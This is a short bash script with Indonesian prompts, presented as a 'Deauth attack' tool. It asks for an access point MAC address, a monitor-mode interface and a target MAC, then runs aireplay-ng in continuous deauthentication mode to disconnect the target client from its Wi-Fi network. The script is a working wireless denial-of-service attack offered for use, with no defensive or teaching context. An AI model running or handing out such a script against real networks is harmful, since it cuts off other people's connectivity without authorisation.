#!/bin/bash

echo  "=============tools  Deauth attack============";
echo "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
echo "=============Created by M.Husen===============";
echo "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^";
read -p "masukan mac AP  :" m;
read -p "masukan mode monitor (misal:mon0): " i;
read -p "masukan mac target:" e;
 sudo aireplay-ng -0 0 -a $m -c $e --ignore-negative-one $i
